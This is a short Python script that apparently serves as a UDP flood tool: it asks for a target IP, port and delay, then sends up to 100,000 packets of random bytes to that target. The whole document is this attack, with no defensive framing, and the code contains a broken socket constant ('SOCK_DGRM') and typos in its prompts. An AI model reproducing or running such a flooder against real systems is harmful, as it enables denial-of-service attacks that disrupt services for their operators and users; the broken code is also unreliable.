import socket
import random
import time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRM)
ip = input("TArget IP: ")
port = int(input("TArget Port:"))
sleep = float(input("Sleep: "))

s.connect((ip,port))

for i in range(1, 100*1000):
    s.send(random._urandom(10)*1000)
    print(f"send: {i})", end= '\r')
    time.sleep(sleep)
